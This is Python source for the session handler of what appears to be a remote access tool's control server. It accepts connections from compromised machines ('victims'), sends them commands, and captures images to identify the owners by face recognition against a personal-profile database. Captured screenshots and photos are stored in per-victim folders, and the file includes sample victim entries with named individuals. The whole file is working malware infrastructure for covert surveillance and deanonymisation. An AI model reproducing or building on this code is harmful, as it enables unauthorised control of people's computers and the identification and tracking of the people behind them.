from modules import helper as h
from azure import faceRec
import threading, socket, time, sys
import json
from PIL import Image
import os


class MultiHandler:
	def __init__(self,server):
		self.server = server
		self.thread = None
		self.new_session_id = -1
		self.sessions_id = dict()
		self.sessions_uid = dict()
		self.person_db = dict()
		self.faceid_mapping = dict()

		self.victims = dict()
		self.victims['victims'] = []
		self.victims['total_victims'] = 0
		self.victims_modify = False
		self.identified_victims = dict()
		self.identified_victims['identified_victims'] = []
		self.identified_victims['total_identified_victims'] = 0

		# Fake Victims to Show
		self.fake_victims = [
			{
				"session_id": -1,
				"ip_address": ["127.0.0.1", 8000],
				"victim_info":
					{
						"username": "gagan",
						"hostname": "Gagan's MacBook Pro",
						"type": "macos"
					},
				"identified": True
			},
			{
				"session_id": -2,
				"ip_address": ["127.0.0.1", 8001],
				"victim_info":
					{
						"username": "yatin",
						"hostname": "Yatin's MacBook Pro",
						"type": "macos"
					},
				"identified": True
			},
			{
				"session_id": -3,
				"ip_address": ["127.0.0.1", 8002],
				"victim_info":
					{
						"username": "maria",
						"hostname": "Maria's MacBook Pro",
						"type": "macos"
					},
				"identified": True
			},
			{
				"session_id": -4,
				"ip_address": ["127.0.0.1", 8003],
				"victim_info":
					{
						"username": "victor",
						"hostname": "Victor's MacBook Pro",
						"type": "macos"
					},
				"identified": True
			}
		]

		# Fake Identified Victims to Show
		self.fake_identified_victims = [
			{
				"session_id": -1,
				"profile":
					{
						"picture": "DB/Gagan/gagan_face.jpg",
						"name": "Gagan",
						"privacy": "DB/Gagan/profile_Gagan Vasudev.json"
					}
			},
			{
				"session_id": -2,
				"profile":
					{
						"picture": "DB/Yatin/yatin_face.jpg",
						"name": "Yatin",
						"privacy": "DB/Yatin/profile_Yatin Gupta.json"
					}
			},
			{
				"session_id": -3,
				"profile":
					{
						"picture": "DB/Maria/maria_face.jpg",
						"name": "Maria",
						"privacy": "DB/Maria/profile_Maria Fernandes.json"
					}
			},

			{
				"session_id": -4,
				"profile":
					{
						"picture": "DB/Victor/victor_face.jpg",
						"name": "Victor",
						"privacy": "DB/Victor/profile_Victor Zamarian.json"
					}
			}
		]

		self.handle = h.COLOR_INFO + "MultiHandler" + h.ENDC + "> "
		self.is_running = False
		self.load_person_info()
		self.load_faceid2person()

	def load_person_info(self):
		json_file = open("privacy_db.json")
		self.person_db = json.load(json_file)
		json_file.close()

	def load_faceid2person(self):
		json_file = open("faceid_mapping.json")
		self.faceid_mapping = json.load(json_file)
		json_file.close()


	def update_session(self,current_session,new_session):
		current_session.conn = new_session.conn
		current_session.username = new_session.username
		current_session.hostname = new_session.hostname
		current_session.type = new_session.type
		current_session.needs_refresh = False
		sys.stdout.write("\n"+current_session.get_handle())
		sys.stdout.flush()


	def background_listener(self):
		self.server.is_multi = True
		self.is_running = True
		id_number = 1
		while 1:
			if self.is_running:
				session_infos = self.server.listen_for_stager()
				if session_infos:
					session, hostAddress = session_infos
					if session.uid in self.sessions_uid.keys():
						if self.sessions_uid[session.uid].needs_refresh:
							self.update_session(self.sessions_uid[session.uid],session)
						continue
					else:
						self.sessions_uid[session.uid] = session
						self.sessions_id[id_number] = session
						self.new_session_id = id_number
						session.id = id_number
						victim = {}
						victim_info = {}

						# Construct victims info dict
						victim['session_id'] = id_number
						victim['ip_address'] = hostAddress
						victim_info['username'] = session.username
						victim_info['hostname'] = session.hostname
						victim_info['type'] = session.type
						victim['victim_info'] = victim_info
						victim['identified'] = False

						# Append victim into victim list
						self.victims['victims'].append(victim)
						self.victims['total_victims'] += 1
						id_number += 1
						sys.stdout.write("\n{0}[*]{2} Session {1} opened{2}\n{3}".format(h.COLOR_INFO,str(session.id),h.WHITE,self.handle))
						sys.stdout.flush()

						# Whether this victim is identified
						# If identified, add this victim into identified victim list
						self.identify_victim(session.id)

						# Notify that victims have been changed
						self.victims_modify = True
#						self.init_interact_with_session()
			else:
				h.info_general("Exit the listener")
				return


	def start_background_server(self):
		self.thread = threading.Thread(target=self.background_listener)
		self.thread.setDaemon(False)
		self.thread.start()


	def close_all_sessions(self):
		h.info_general("Cleaning up...")
		for key in self.sessions_id.keys():
			session = self.sessions_id[key]
			session.disconnect(False)


	def show_session(self,session):
		try:
			print str(session.id) + " | " +\
			session.username + "@" + session.hostname + " | " + \
			str(session.conn.getpeername()[0]) 
		except Exception as e:
			h.info_error(str(e))


	def list_sessions(self):
		if not self.sessions_id:
			h.info_general("No active sessions")
		else:
			for key in self.sessions_id:
				self.show_session(self.sessions_id[key])


	def interact_with_session(self,session_number, cmd_data):
		if not session_number:
			print "Usage: interact (session number)"
			return None
		try:
			return self.sessions_id[int(session_number)].interact(cmd_data)
		except:
			h.info_error("Invalid Session")
			return None


	def close_session(self,session_number):
		if not session_number:
			print "Usage: close (session number)"
			return
		try:
			session = self.sessions_id[int(session_number)]
			session.disconnect(False)
			h.info_general('Closing session ' + session_number)
		except Exception as e:
			print e
			h.info_error("Invalid Session")


	def stop_server(self):
		self.close_all_sessions()
		self.is_running = False
		if self.thread:
			socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((self.server.host,self.server.port))
			self.thread.join()
		time.sleep(0.5)


	def show_command(self,name,description):
		print name + " " * (15 - len(name)) + ": " + description


	def show_commands(self):
		commands = [
			("interact","interact with session"),
			("close","close active session"),
			("sessions","list sessions"),
			("exit","close all sessions and exit to menu"),
		]
		print h.WHITEBU+"MultiHandler Commands:"+h.ENDC
		for command in commands:
			self.show_command(command[0],command[1])

	def identify_victim(self, session_id):
		if session_id < 1:
			h.info_error("Invalid Session")
			return False
		try:
			idx = session_id - 1
			victim = self.victims['victims'][idx]

			# if already identified, return True
			if victim['identified']:
				return True

			file_name = self.sessions_id[session_id].init_interact()
			response = faceRec(file_name)
			response = json.loads(response)
			h.info_general("Face Rec Result:")
			print(response)
			if response['status'] == "Ok":
				print(response['faceId'])
				faceid = response['faceId']
				if faceid in self.faceid_mapping['FaceToPerson']:
					person_name = self.faceid_mapping['FaceToPerson'][faceid]
					for person in self.person_db['Person']:
						if person['name'] == person_name:
							identified_victim = {}
							identified_victim['session_id'] = session_id
							identified_victim['profile'] = person
							self.identified_victims['identified_victims'].append(identified_victim)
							self.identified_victims['total_identified_victims'] += 1
							break
					victim['identified'] = True
					return True
				else:
					print("Person not in Database")
					return False
			else:
				print("No Face Rec result")
				return False
		except:
			h.info_error("Person cannot be recognized")
			return False

	# When victim connected to server, init the interaction by identify victims'
	# information
	def init_interact_with_session(self):
		if self.new_session_id < 1:
			h.info_error("Invalid Session")
			return
		try:
			file_name = self.sessions_id[self.new_session_id].init_interact()
			response = faceRec(file_name)
			response = json.loads(response)
			h.info_general("Face Rec Result:")
			print(response)
			if response['status'] == "Ok":
				print(response['faceId'])
				faceid = response['faceId']
			else:
				print("no data match")
				faceid = ""
			if faceid in self.faceid_mapping['FaceToPerson']:
				person_name = self.faceid_mapping['FaceToPerson'][faceid]
				for person in self.person_db['Person']:
					if person['name'] == person_name:
						self.victims[self.new_session_id] = person
						self.victims_modify = True
		except:
			h.info_error("Person cannot be recognized")

	# Interact with victims' machines
	def interact(self, session_id, cmd_data):
		try:
			cmd = cmd_data.split()[0]
			para = {"cmd": cmd, "args": cmd_data[len(cmd) + 1:]}
			result = self.interact_with_session(session_id, cmd_data)
			return result
		except KeyboardInterrupt:
			sys.stdout.write("\n")
			self.stop_server()
			return None

	# Save the Action Results (Screen shots or photos into personal Database)
	# Filename: the image filename under pictures directory
	def save_images(self, session_id, filename):
		if session_id < 1:
			h.info_error("Invalid Session")
			return
		try:
			idx = session_id - 1
			victim = self.victims['victims'][idx]

			# Only save the image for identified victim
			if not victim['identified']:
				h.info_general("Session has not been identified")
				return

			victim_name = None
			identified_victims = self.identified_victims['identified_victims']
			for victim in identified_victims:
				if victim['session_id'] == session_id:
					victim_name = victim['profile']['name']
					break

			# Had found the victim, save the image in personal db
			if victim_name:
				try:
					image_path = "./DB/pictures/" + filename
					personal_db_image_path = "./DB/" + victim_name + "/Images/"
					if not os.path.exists(personal_db_image_path):
						os.makedirs(personal_db_image_path)
					image = Image.open(image_path)
					image.save(personal_db_image_path+filename, optimize=True, quality=10)
					h.info_general("Saved to" + personal_db_image_path + filename)
					return
				except:
					h.info_error("Image save path error")
					return
			else:
				h.info_general("Haven't found the target victim")
				return

		except:
			h.info_error("Error in Saving the image")
			return

	# Get all history Images for specific victim (victim_name)
	# Return all image filenames under DB/{victim_name}/Images/
	def get_all_images(self, victim_name):
		if not victim_name:
			h.info_error("Invalid victim name")
			return None

		try:
			try:
				victim_db_path = "./DB/"
				victims_folders = os.listdir(victim_db_path)
				if victim_name not in victims_folders:
					h.info_general("Unidentified victim")
					return None
			except:
				return None

			# Had found the victim folder, get all image files
			if victim_name:
				try:
					personal_db_image_path = "DB/" + victim_name + "/Images/"
					if not os.path.exists(personal_db_image_path):
						os.makedirs(personal_db_image_path)
					images = [f for f in os.listdir(personal_db_image_path) if f.endswith('.jpg')]
					total_images = len(images)
					results = {}
					results['images'] = images
					results['total_images'] = total_images
					results['image_path'] = personal_db_image_path
					return results
				except:
					h.info_error("Fetching Images Error")
					return None
			else:
				h.info_general("Invalid victim name")
				return None

		except:
			h.info_error("Error in get the images")
			return None

